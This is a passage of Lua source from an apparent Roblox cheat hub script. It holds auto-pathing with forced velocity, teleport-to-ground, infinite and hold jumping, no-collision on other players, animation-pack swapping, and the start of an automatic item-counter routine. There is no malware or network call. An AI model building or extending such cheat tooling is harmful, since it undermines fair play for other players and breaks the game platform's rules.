    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            for _, part in ipairs(p.Character:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        end
    end
end)


-- ========== AUTO LEFT / AUTO RIGHT (FULL FRHUB PORT) ==========
-- Pure's old path backend is gone. This block carries FRHUB's complete path
-- coordinates, two-phase controller, speed selection, LinearVelocity driver,
-- completion behavior, stop behavior, visual sync and toggle functions.
-- The scope releases all internal helper registers after this backend is built.
do
local FRHubAutoPathPOS = {
    L1=Vector3.new(-476.48,-6.28,92.73), L2=Vector3.new(-483.12,-4.95,94.80),
    R1=Vector3.new(-476.16,-6.52,25.62), R2=Vector3.new(-483.04,-5.09,23.14),
}
local FRHubAutoPathConns = {autoLeft=nil, autoRight=nil}
local FRHubAutoLeftPhase, FRHubAutoRightPhase = 1, 1

local function getFRHubAutoMoveSpeed()
    if laggerCarryToggled then return NS
    elseif laggerModeEnabled then return LAGGER_SPEED
    else return NS end
end

-- Dedicated copy of the horizontal branch used by FRHUB's _setV helper. It
-- prevents Pure's normal speed actuator from replacing the Auto Path force.
local FRHubAutoVelocityCache = setmetatable({}, {__mode="k"})
local function destroyFRHubAutoVelocity(root)
    local cached=FRHubAutoVelocityCache[root]
    if cached then
        pcall(function() if cached[1] and cached[1].Parent then cached[1]:Destroy() end end)
        pcall(function() if cached[2] and cached[2].Parent then cached[2]:Destroy() end end)
        FRHubAutoVelocityCache[root]=nil
    end
end
local function getFRHubAutoVelocity(root)
    local cached=FRHubAutoVelocityCache[root]
    local lv=cached and cached[1]
    if lv and lv.Parent==root then return lv end
    destroyFRHubAutoVelocity(root)
    local attachment=Instance.new("Attachment"); attachment.Name="FRHubAutoPathAttachment"; attachment.Parent=root
    lv=Instance.new("LinearVelocity")
    lv.Name="FRHubAutoPathVelocity"
    lv.Attachment0=attachment
    lv.VelocityConstraintMode=Enum.VelocityConstraintMode.Plane
    lv.PrimaryTangentAxis=Vector3.new(1,0,0)
    lv.SecondaryTangentAxis=Vector3.new(0,0,1)
    lv.MaxForce=math.huge
    lv.RelativeTo=Enum.ActuatorRelativeTo.World
    lv.PlaneVelocity=Vector2.zero
    lv.Parent=root
    FRHubAutoVelocityCache[root]={lv,attachment}
    return lv
end
local function setFRHubAutoVelocity(root, velocity)
    if not root or not root.Parent then return end
    if velocity.Magnitude < 0.01 then return end
    root.AssemblyLinearVelocity = Vector3.new(velocity.X, root.AssemblyLinearVelocity.Y, velocity.Z)
end
_G.PureCursedClearAutoPathVelocity = function(root)
    if root then setFRHubAutoVelocity(root,Vector3.zero) end
end

startAutoLeft = function()
    if FRHubAutoPathConns.autoLeft then FRHubAutoPathConns.autoLeft:Disconnect() end
    FRHubAutoLeftPhase=1
    FRHubAutoPathConns.autoLeft=RunService.Heartbeat:Connect(function()
        if not autoLeftEnabled then return end
        local char=LP.Character; if not char then return end
        local root=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end; local spd=getFRHubAutoMoveSpeed()
        if FRHubAutoLeftPhase==1 then
            local target=Vector3.new(FRHubAutoPathPOS.L1.X,root.Position.Y,FRHubAutoPathPOS.L1.Z)
            if (target-root.Position).Magnitude<1 then FRHubAutoLeftPhase=2; return end
            local delta=FRHubAutoPathPOS.L1-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
        elseif FRHubAutoLeftPhase==2 then
            local target=Vector3.new(FRHubAutoPathPOS.L2.X,root.Position.Y,FRHubAutoPathPOS.L2.Z)
            if (target-root.Position).Magnitude<1 then
                hum:Move(Vector3.zero,false); setFRHubAutoVelocity(root,Vector3.zero)
                autoLeftEnabled=false
                if FRHubAutoPathConns.autoLeft then FRHubAutoPathConns.autoLeft:Disconnect(); FRHubAutoPathConns.autoLeft=nil end
                FRHubAutoLeftPhase=1
                if autoLeftSetVisual then autoLeftSetVisual(false) end
                if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(false) end
                saveConfig()
                return
            end
            local delta=FRHubAutoPathPOS.L2-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
        end
    end)
end

stopAutoLeft = function()
    if FRHubAutoPathConns.autoLeft then FRHubAutoPathConns.autoLeft:Disconnect(); FRHubAutoPathConns.autoLeft=nil end
    FRHubAutoLeftPhase=1
    local char=LP.Character
    if char then
        local hum=char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero,false) end
    end
    if autoLeftSetVisual then autoLeftSetVisual(false) end
    if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(false) end
end

startAutoRight = function()
    if FRHubAutoPathConns.autoRight then FRHubAutoPathConns.autoRight:Disconnect() end
    FRHubAutoRightPhase=1
    FRHubAutoPathConns.autoRight=RunService.Heartbeat:Connect(function()
        if not autoRightEnabled then return end
        local char=LP.Character; if not char then return end
        local root=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end; local spd=getFRHubAutoMoveSpeed()
        if FRHubAutoRightPhase==1 then
            local target=Vector3.new(FRHubAutoPathPOS.R1.X,root.Position.Y,FRHubAutoPathPOS.R1.Z)
            if (target-root.Position).Magnitude<1 then FRHubAutoRightPhase=2; return end
            local delta=FRHubAutoPathPOS.R1-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
        elseif FRHubAutoRightPhase==2 then
            local target=Vector3.new(FRHubAutoPathPOS.R2.X,root.Position.Y,FRHubAutoPathPOS.R2.Z)
            if (target-root.Position).Magnitude<1 then
                hum:Move(Vector3.zero,false); setFRHubAutoVelocity(root,Vector3.zero)
                autoRightEnabled=false
                if FRHubAutoPathConns.autoRight then FRHubAutoPathConns.autoRight:Disconnect(); FRHubAutoPathConns.autoRight=nil end
                FRHubAutoRightPhase=1
                if autoRightSetVisual then autoRightSetVisual(false) end
                if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(false) end
                saveConfig()
                return
            end
            local delta=FRHubAutoPathPOS.R2-root.Position; local move=Vector3.new(delta.X,0,delta.Z).Unit
            hum:Move(move,false); setFRHubAutoVelocity(root,Vector3.new(move.X*spd,0,move.Z*spd))
        end
    end)
end

stopAutoRight = function()
    if FRHubAutoPathConns.autoRight then FRHubAutoPathConns.autoRight:Disconnect(); FRHubAutoPathConns.autoRight=nil end
    FRHubAutoRightPhase=1
    local char=LP.Character
    if char then
        local hum=char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero,false) end
    end
    if autoRightSetVisual then autoRightSetVisual(false) end
    if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(false) end
end

toggleAutoLeft = function()
    autoLeftEnabled=not autoLeftEnabled
    if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
    if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(autoLeftEnabled) end
    if autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
    saveConfig()
end

toggleAutoRight = function()
    autoRightEnabled=not autoRightEnabled
    if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
    if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(autoRightEnabled) end
    if autoRightEnabled then startAutoRight() else stopAutoRight() end
    saveConfig()
end

LP.CharacterAdded:Connect(function()
    task.wait(0.5)
    if autoLeftEnabled then startAutoLeft() end
    if autoRightEnabled then startAutoRight() end
end)
end

function runDrop()
    -- Ace Drop: briefly rise, then place the player safely on the ground.
    if __HH.dropActive then return end
    if __HH.autoTPEnabled and __HH.stopAutoTP then __HH.stopAutoTP() end

    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    __HH.dropActive = true
    local startTime = tick()
    local dropConn
    dropConn = RunService.Heartbeat:Connect(function()
        local currentChar = LP.Character
        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
        if not currentChar or not currentRoot then
            if dropConn then dropConn:Disconnect() end
            __HH.dropActive = false
            return
        end

        if tick() - startTime >= 0.2 then
            if dropConn then dropConn:Disconnect() end
            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {currentChar}
            rayParams.FilterType = Enum.RaycastFilterType.Exclude
            local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
            if rayResult then
                local hum = currentChar:FindFirstChildOfClass("Humanoid")
                local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
                currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
                currentRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                currentRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            end
            __HH.dropActive = false
            return
        end

        currentRoot.Velocity = Vector3.new(currentRoot.Velocity.X, 150, currentRoot.Velocity.Z)
    end)
end

local _lastTPTime = 0
local function doPureAutoTPDown(force)
    local char=LP.Character
    if not char then return end
    local hrp=char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if not hum2 then return end
    if not force then
        if hum2.FloorMaterial ~= Enum.Material.Air then return end
        if not (hrp.Position.Y >= __HH.autoTPHeight) then return end
    end
    hrp.CFrame=CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z)
        * CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0)
    hrp.Velocity=Vector3.zero
end

function startAutoTP()
    if __HH.autoTPConn then
        pcall(function() task.cancel(__HH.autoTPConn) end)
        __HH.autoTPConn=nil
    end
    _G.FRHUB_AUTO_TP_DOWN_ACTIVE=true
    __HH.autoTPConn=task.spawn(function()
        while __HH.autoTPEnabled do
            task.wait(0.1)
            pcall(function() doPureAutoTPDown(false) end)
        end
    end)
end

__HH.stopAutoTP=function()
    __HH.autoTPEnabled=false
    _G.FRHUB_AUTO_TP_DOWN_ACTIVE=false
    if __HH.autoTPConn then
        pcall(function() task.cancel(__HH.autoTPConn) end)
        __HH.autoTPConn=nil
    end
end

__HH.tpToGround = function()
    local char=LP.Character; if not char then return end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
    hrp.CFrame=CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z)*CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0)

    -- FRHUB finishes with _setV(hrp, Vector3.zero). Clear Pure's equivalent
    -- movement constraints without using the deleted Pure TP DOWN backend.
    if _G.PureCursedClearAimVelocity then pcall(_G.PureCursedClearAimVelocity) end
    if _G.PureCursedClearAutoPathVelocity then pcall(_G.PureCursedClearAutoPathVelocity,hrp) end
    destroySpeedLV()
    destroyVertLV()
end

__HH.startUnwalk = function()
    local c = LP.Character; if not c then return end
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then for _, t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end end
    local anim = c:FindFirstChild("Animate")
    if anim then __HH.unwalkSavedAnimate = anim:Clone(); anim:Destroy() end
end

__HH.stopUnwalk = function()
    local c = LP.Character
    if c and __HH.unwalkSavedAnimate then __HH.unwalkSavedAnimate:Clone().Parent = c; __HH.unwalkSavedAnimate = nil end
end


-- Ace Animation Pack (Replaced with Asker Hub Animation Packs)
__HH.aceSelectedAnimationPack = "OFF"
__HH.aceAnimationPackIndex = 1
__HH.aceAnimationPackList = {
    "OFF",
    "Unwalk",
    "Hit Harder",
    "Crazy",
    "Adidas Sports",
    "Adidas Community",
    "Adidas Aura",
    "Wicked Popular",
    "Elder",
    "Zombie",
    "Mage",
    "Catwalk Glam",
    "Astronaut",
    "Wicked \"Dancing Through Life\"",
    "Werewolf",
    "Superhero",
    "Toy",
    "No Boundaries",
    "NFL",
    "Amazon Unboxed",
    "Vampire",
    "Ninja",
    "Robot",
    "Levitation",
    "Stylish",
    "Bubbly",
    "Cartoon"
}
local aceAnimationPacks = {
    ["Crazy"] = {
        WalkAnim = 134824450619865,
        RunAnim = 134824450619865,
        JumpAnim = 121454505477205,
        FallAnim = 94788218468396,
        SwimIdle = 121454505477205,
        Swim = 121454505477205,
        Animation1 = 133806214992291,
        Animation2 = 94970088341563,
        ClimbAnim = 121454505477205,
    },
    ["Adidas Sports"] = {
        WalkAnim = 18537392113,
        RunAnim  = 18537384940,
        JumpAnim = 18537380791,
        FallAnim = 18537367238,
        SwimIdle = 18537387180,
        Swim     = 18537389531,
        Animation1 = 18537376492,
        Animation2 = 18537371272,
        ClimbAnim = 18537363391,
    },
    ["Adidas Community"] = {
        WalkAnim = 122150855457006,
        RunAnim  = 82598234841035,
        JumpAnim = 75290611992385,
        FallAnim = 98600215928904,
        SwimIdle = 109346520324160,
        Swim     = 133308483266208,
        Animation1 = 122257458498464,
        Animation2 = 102357151005774,
        ClimbAnim = 88763136693023,
    },
    ["Adidas Aura"] = {
        WalkAnim = 83842218823011,
        RunAnim  = 118320322718866,
        JumpAnim = 109996626521204,
        FallAnim = 95603166884636,
        SwimIdle = 94922130551805,
        Swim     = 134530128383903,
        Animation1 = 110211186840347,
        Animation2 = 114191137265065,
        ClimbAnim = 97824616490448,
    },
    ["Wicked Popular"] = {
        WalkAnim = 92072849924640,
        RunAnim = 72301599441680,
        JumpAnim = 104325245285198,
        FallAnim = 121152442762481,
        Animation1 = 118832222982049,
        ClimbAnim = 131326830509784,
        SwimIdle = 113199415118199,
        Swim = 99384245425157,
        Animation2 = 76049494037641,
    },
    Elder = {
        WalkAnim = 10921111375,
        RunAnim  = 10921104374,
        JumpAnim = 10921107367,
        FallAnim = 10921105765,
        SwimIdle = 10921110146,
        Swim     = 10921108971,
        ClimbAnim = 10921100400,
        Animation1 = 10921101664,
        Animation2 = 10921102574,
    },
    Zombie = {
        WalkAnim = 10921355261,
        RunAnim  = 616163682,
        JumpAnim = 10921351278,
        FallAnim = 10921350320,
        SwimIdle = 10921353442,
        Swim     = 10921352344,
        Animation1 = 10921344533,
        Animation2 = 10921345304,
        ClimbAnim = 10921343576,
    },
    Mage = {
        WalkAnim = 10921152678,
        RunAnim  = 10921148209,
        JumpAnim = 10921149743,
        FallAnim = 10921148939,
        SwimIdle = 10921151661,
        Swim     = 10921150788,
        ClimbAnim = 10921143404,
        Animation1 = 10921144709,
        Animation2 = 10921145797,
    },
    ["Catwalk Glam"] = {
        WalkAnim = 109168724482748,
        RunAnim  = 81024476153754,
        JumpAnim = 116936326516985,
        FallAnim = 92294537340807,
        SwimIdle = 98854111361360,
        Swim     = 134591743181628,
        ClimbAnim = 119377220967554,
        Animation1 = 133806214992291,
        Animation2 = 94970088341563,
    },
    Astronaut = {
        WalkAnim = 10921046031,
        RunAnim  = 10921039308,
        JumpAnim = 10921042494,
        FallAnim = 10921040576,
        SwimIdle = 10921045006,
        Swim     = 10921044000,
        ClimbAnim = 10921032124,
        Animation1 = 10921034824,
        Animation2 = 10921036806,
    },
    ['Wicked "Dancing Through Life"'] = {
        WalkAnim = 73718308412641,
        RunAnim  = 135515454877967,
        JumpAnim = 78508480717326,
        FallAnim = 78147885297412,
        SwimIdle = 129183123083281,
        Swim     = 110657013921774,
        ClimbAnim = 129447497744818,
        Animation1 = 92849173543269,
        Animation2 = 132238900951109,
    },
    Werewolf = {
        WalkAnim = 10921342074,
        RunAnim  = 10921336997,
        JumpAnim = nil,
        FallAnim = 10921337907,
        SwimIdle = 10921341319,
        Swim     = 10921340419,
        ClimbAnim = 10921329322,
        Animation1 = 10921330408,
        Animation2 = 10921333667,
    },
    Superhero = {
        WalkAnim = 10921298616,
        RunAnim  = 10921291831,
        JumpAnim = 10921294559,
        FallAnim = 10921293373,
        SwimIdle = 10921297391,
        Swim     = 10921295495,
        ClimbAnim = 10921286911,
        Animation1 = 10921288909,
        Animation2 = 10921290167,
    },
    Toy = {
        WalkAnim = 10921312010,
        RunAnim  = 10921306285,
        JumpAnim = 10921308158,
        FallAnim = 10921307241,
        SwimIdle = 10921310341,
        Swim     = 10921309319,
        ClimbAnim = 10921300839,
        Animation1 = 10921301576,
        Animation2 = nil,
    },
    ["No Boundaries"] = {
        WalkAnim = 18747074203,
        RunAnim  = 18747070484,
        JumpAnim = 18747069148,
        FallAnim = 18747062535,
        SwimIdle = 18747071682,
        Swim     = 18747073181,
        ClimbAnim = 18747060903,
        Animation1 = 18747067405,
        Animation2 = 18747063918,
    },
    NFL = {
        WalkAnim = 110358958299415,
        RunAnim  = 117333533048078,
        JumpAnim = 119846112151352,
        FallAnim = 129773241321032,
        SwimIdle = 79090109939093,
        Swim     = 132697394189921,
        ClimbAnim = 134630013742019,
        Animation1 = 92080889861410,
        Animation2 = 74451233229259,
    },
    ["Amazon Unboxed"] = {
        WalkAnim = 90478085024465,
        RunAnim  = 134824450619865,
        JumpAnim = 121454505477205,
        FallAnim = 94788218468396,
        SwimIdle = 129126268464847,
        Swim     = 105962919001086,
        ClimbAnim = 121145883950231,
        Animation1 = 98281136301627,
        Animation2 = nil,
    },
    Vampire = {
        WalkAnim = 10921326949,
        RunAnim  = 10921320299,
        JumpAnim = 10921322186,
        FallAnim = 10921321317,
        SwimIdle = 10921325443,
        Swim     = 10921324408,
        ClimbAnim = 10921314188,
        Animation1 = 10921315373,
        Animation2 = nil,
    },
    Ninja = {
        Run=656118852, Walk=656121766, Jump=656117878, Fall=656115606,
        Swim=656119721, SwimIdle=656121397, Climb=656114359,
        Idle={656117400,656118341,886742569}
    },
    Robot = {
        Run=616091570, Walk=616095330, Jump=616090535, Fall=616087089,
        Swim=616092998, SwimIdle=616094091, Climb=616086039,
        Idle={616088211,616089559,885531463}
    },
    Levitation = {
        Run=616010382, Walk=616013216, Jump=616008936, Fall=616005863,
        Swim=616011509, SwimIdle=616012453, Climb=616003713,
        Idle={616006778,616008087,886862142}
    },
    Stylish = {
        Run=616140816, Walk=616146177, Jump=616139451, Fall=616134815,
        Swim=616143378, SwimIdle=616144772, Climb=616133594,
        Idle={616136790,616138447,886888594}
    },
    Bubbly = {
        Run=910025107, Walk=910034870, Jump=910016857, Fall=910001910,
        Swim=910028158, SwimIdle=910030921, Climb=909997997,
        Idle={910004836,910009958,1018536639}
    },
    Cartoon = {
        Run=742638842, Walk=742640026, Jump=742637942, Fall=742637151,
        Swim=742639220, SwimIdle=742639812, Climb=742636889,
        Idle={742637544,742638445,885477856}
    },
}
local aceSavedAnimate = nil
__HH.aceOriginalAnims = {}
local aceHitHarderAnimEnabled = false
local aceHitHarderAnims = {
    idle1 = "rbxassetid://133806214992291", idle2 = "rbxassetid://94970088341563",
    walk = "rbxassetid://707897309", run = "rbxassetid://707861613",
    jump = "rbxassetid://116936326516985", fall = "rbxassetid://116936326516985",
}

local function aceGetAnimate(char)
    char = char or LP.Character
    return char and char:FindFirstChild("Animate") or nil
end

local function aceStopCurrentAnimations(char)
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
        pcall(function() track:Stop(0) end)
    end
end

local function aceSetAnim(animObj, id)
    if animObj and id then
        local idStr = tostring(id)
        if not string.find(idStr, "rbxassetid://") then
            idStr = "rbxassetid://" .. idStr
        end
        pcall(function() animObj.AnimationId = idStr end)
    end
end

local function aceEnsureAnim(folder, name)
    if not folder then return nil end
    local a = folder:FindFirstChild(name)
    if not a then
        a = Instance.new("Animation")
        a.Name = name
        a.Parent = folder
    end
    return a
end

local function aceEnsureIdleSlots(idleFolder, n)
    if not idleFolder then return end
    n = n or 2
    for i = 1, n do
        aceEnsureAnim(idleFolder, "Animation" .. i)
    end
end

local function acePick(pack, ...)
    for i = 1, select("#", ...) do
        local k = select(i, ...)
        local v = pack[k]
        if v ~= nil then return v end
    end
    return nil
end

local function aceSaveOriginalAnimate(char)
    if not char then return end
    if aceSavedAnimate then return end
    local animate = char:FindFirstChild("Animate")
    if animate then
        aceSavedAnimate = animate:Clone()
    end
end

local function aceResetAnimations()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        aceStopCurrentAnimations(char)
    end
    if not aceSavedAnimate then return end
    local currentAnimate = char:FindFirstChild("Animate")
    if currentAnimate then
        currentAnimate:Destroy()
    end
    local newAnimate = aceSavedAnimate:Clone()
    newAnimate.Parent = char
    newAnimate.Disabled = true
    task.wait(0.06)
    newAnimate.Disabled = false
end

local function aceEnableUnwalk()
    __HH.unwalkEnabled = true
    local char = LP.Character
    if char and char:FindFirstChild("Animate") then __HH.startUnwalk() end
    if setUnwalkVisual then setUnwalkVisual(true) end
end

local function aceDisableUnwalk()
    if __HH.unwalkEnabled then __HH.stopUnwalk() end
    __HH.unwalkEnabled = false
    if setUnwalkVisual then setUnwalkVisual(false) end
end

local function aceEnableHitHarderAnimation()
    aceHitHarderAnimEnabled = true
    local char = LP.Character
    local animate = aceGetAnimate(char)
    if not animate then return end
    aceSaveOriginalAnimate(char)
    aceStopCurrentAnimations(char)
    local idle1 = animate.idle and animate.idle:FindFirstChild("Animation1")
    local idle2 = animate.idle and animate.idle:FindFirstChild("Animation2")
    local walkObj = animate.walk and animate.walk:FindFirstChild("WalkAnim")
    local runObj = animate.run and animate.run:FindFirstChild("RunAnim")
    local jumpObj = animate.jump and animate.jump:FindFirstChild("JumpAnim")
    local fallObj = animate.fall and animate.fall:FindFirstChild("FallAnim")
    if idle1 then pcall(function() idle1.AnimationId = aceHitHarderAnims.idle1 end) end
    if idle2 then pcall(function() idle2.AnimationId = aceHitHarderAnims.idle2 end) end
    if walkObj then pcall(function() walkObj.AnimationId = aceHitHarderAnims.walk end) end
    if runObj then pcall(function() runObj.AnimationId = aceHitHarderAnims.run end) end
    if jumpObj then pcall(function() jumpObj.AnimationId = aceHitHarderAnims.jump end) end
    if fallObj then pcall(function() fallObj.AnimationId = aceHitHarderAnims.fall end) end
    pcall(function()
        animate.Disabled = true
        task.wait()
        animate.Disabled = false
    end)
end

local function aceDisableHitHarderAnimation()
    aceHitHarderAnimEnabled = false
    aceResetAnimations()
end

__HH.aceSyncAnimationPackIndex = function()
    for i, name in ipairs(__HH.aceAnimationPackList) do
        if name == __HH.aceSelectedAnimationPack then
            __HH.aceAnimationPackIndex = i
            return
        end
    end
    __HH.aceSelectedAnimationPack = "OFF"
    __HH.aceAnimationPackIndex = 1
end

__HH.aceApplyAnimationPack = function(packName)
    __HH.aceSelectedAnimationPack = packName or "OFF"
    __HH.aceSyncAnimationPackIndex()

    if __HH.aceSelectedAnimationPack ~= "Unwalk" then
        aceDisableUnwalk()
    end
    if __HH.aceSelectedAnimationPack ~= "Hit Harder" and aceHitHarderAnimEnabled then
        aceDisableHitHarderAnimation()
    end
    if __HH.aceSelectedAnimationPack == "Unwalk" then
        aceResetAnimations()
        aceEnableUnwalk()
        return
    end
    if __HH.aceSelectedAnimationPack == "Hit Harder" then
        aceEnableHitHarderAnimation()
        return
    end
    if __HH.aceSelectedAnimationPack == "OFF" then
        aceResetAnimations()
        return
    end

    local pack = aceAnimationPacks[__HH.aceSelectedAnimationPack]
    local char = LP.Character
    local animate = aceGetAnimate(char)
    if not pack or not animate then return end
    aceSaveOriginalAnimate(char)
    aceStopCurrentAnimations(char)

    local runObj   = aceEnsureAnim(animate:FindFirstChild("run"),   "RunAnim")
    local walkObj  = aceEnsureAnim(animate:FindFirstChild("walk"),  "WalkAnim")
    local jumpObj  = aceEnsureAnim(animate:FindFirstChild("jump"),  "JumpAnim")
    local fallObj  = aceEnsureAnim(animate:FindFirstChild("fall"),  "FallAnim")
    local climbObj = aceEnsureAnim(animate:FindFirstChild("climb"), "ClimbAnim")
    local swimObj  = aceEnsureAnim(animate:FindFirstChild("swim"),  "Swim")
    local swimIdleObj = aceEnsureAnim(animate:FindFirstChild("swimidle"), "SwimIdle")
    local idleFolder  = animate:FindFirstChild("idle")

    aceSetAnim(walkObj,  acePick(pack, "WalkAnim", "Walk", "walk"))
    aceSetAnim(runObj,   acePick(pack, "RunAnim", "Run", "run"))
    aceSetAnim(jumpObj,  acePick(pack, "JumpAnim", "Jump", "jump"))
    aceSetAnim(fallObj,  acePick(pack, "FallAnim", "Fall", "fall"))
    aceSetAnim(climbObj, acePick(pack, "ClimbAnim", "Climb", "climb"))
    aceSetAnim(swimObj,  acePick(pack, "Swim", "swim"))
    aceSetAnim(swimIdleObj, acePick(pack, "SwimIdle", "swimidle") or acePick(pack, "Swim", "swim"))

    if idleFolder then
        local a1 = acePick(pack, "Animation1")
        local a2 = acePick(pack, "Animation2")
        if a1 or a2 then
            aceEnsureIdleSlots(idleFolder, 2)
            local id1 = a1 or a2
            local id2 = a2 or a1 or id1
            aceSetAnim(idleFolder:FindFirstChild("Animation1"), id1)
            aceSetAnim(idleFolder:FindFirstChild("Animation2"), id2)
        elseif pack.Idle and #pack.Idle > 0 then
            aceEnsureIdleSlots(idleFolder, math.max(2, #pack.Idle))
            aceSetAnim(idleFolder:FindFirstChild("Animation1"), pack.Idle[1])
            aceSetAnim(idleFolder:FindFirstChild("Animation2"), pack.Idle[2] or pack.Idle[1])
            for i = 3, #pack.Idle do
                local a = idleFolder:FindFirstChild("Animation" .. i)
                if a then aceSetAnim(a, pack.Idle[i]) end
            end
        elseif pack.idle and #pack.idle > 0 then
            aceEnsureIdleSlots(idleFolder, math.max(2, #pack.idle))
            aceSetAnim(idleFolder:FindFirstChild("Animation1"), pack.idle[1])
            aceSetAnim(idleFolder:FindFirstChild("Animation2"), pack.idle[2] or pack.idle[1])
            for i = 3, #pack.idle do
                local a = idleFolder:FindFirstChild("Animation" .. i)
                if a then aceSetAnim(a, pack.idle[i]) end
            end
        end
    end

    animate.Disabled = true
    task.wait(0.06)
    animate.Disabled = false

    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Landed)
            task.wait(0.03)
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
    end
end

-- Infinite Jump (voided) — manual + hold mode
local function applyInfJumpBoost(boost)
    if not __HH.infJumpEnabled then return end
    if __HH.infJumpMode == "manual" then
        local char = LP.Character; if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then root.Velocity = Vector3.new(root.Velocity.X, boost, root.Velocity.Z) end
    end
end

__HH.UIS.JumpRequest:Connect(function() applyInfJumpBoost(50) end)
__HH.UIS.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Space and not __HH.UIS:GetFocusedTextBox() then
        task.delay(0.12, function() if __HH.UIS:IsKeyDown(Enum.KeyCode.Space) then applyInfJumpBoost(50) end end)
    end
end)
RunService.Heartbeat:Connect(function()
    if __HH.infJumpEnabled and __HH.infJumpMode == "manual" then
        if __HH.UIS:IsKeyDown(Enum.KeyCode.Space) then applyInfJumpBoost(50) end
    end
end)

__HH.startHoldInfJump = function()
    if __HH.holdInfJumpConn then return end
    __HH.holdInfJumpConn = RunService.Heartbeat:Connect(function()
        if not __HH.infJumpEnabled or __HH.infJumpMode ~= "hold" then return end
        local char = LP.Character; if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local isJumpHeld = __HH.UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true)
        if isJumpHeld and root.Velocity.Y < 35 then root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z) end
        if root.Velocity.Y < -120 then root.Velocity = Vector3.new(root.Velocity.X, -120, root.Velocity.Z) end
    end)
end

__HH.stopHoldInfJump = function()
    if __HH.holdInfJumpConn then __HH.holdInfJumpConn:Disconnect(); __HH.holdInfJumpConn = nil end
end

-- ============ Auto Jump (while holding brainrot, every 2s) ============
-- Detection style matches FR: WalkSpeed < 25 means you're carrying.
-- While holding, applies one 55-stud upward hop every 2 seconds.
__HH.autoJumpBrainrot = __HH.autoJumpBrainrot == true
local autoJumpLastJump = 0
RunService.Heartbeat:Connect(function()
    if not __HH.autoJumpBrainrot then
        autoJumpLastJump = 0
        return
    end
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not hum or not root then
        autoJumpLastJump = 0
        return
    end
    if hum.WalkSpeed >= 25 then
        autoJumpLastJump = 0  -- not holding: reset so next grab jumps instantly
        return
    end
    local now = tick()
    if now - autoJumpLastJump < 2 then return end
    autoJumpLastJump = now
    local cur = root.AssemblyLinearVelocity
    root.AssemblyLinearVelocity = Vector3.new(cur.X, 55, cur.Z)
end)


if __HH.infJumpEnabled and __HH.infJumpMode == "hold" then __HH.startHoldInfJump() end


_G.PureMedusaState = _G.PureMedusaState or {connections={}, debounce=false, lastUsed=0}
local function aceFindMedusa()
    local char=LP.Character; if not char then return nil end
    local function scan(container)
        if not container then return nil end
        for _,tool in ipairs(container:GetChildren()) do
            if tool:IsA("Tool") then local n=tool.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return tool end end
        end
    end
    return scan(char) or scan(LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack"))
end
local function aceUseMedusaCounter(force)
    local state=_G.PureMedusaState
    if (not force and not __HH.medusaCounterEnabled) or state.debounce or tick()-(state.lastUsed or 0)<25 then return end
    local char=LP.Character; if not char then return end
    state.debounce=true
    local tool=aceFindMedusa()
    if tool then
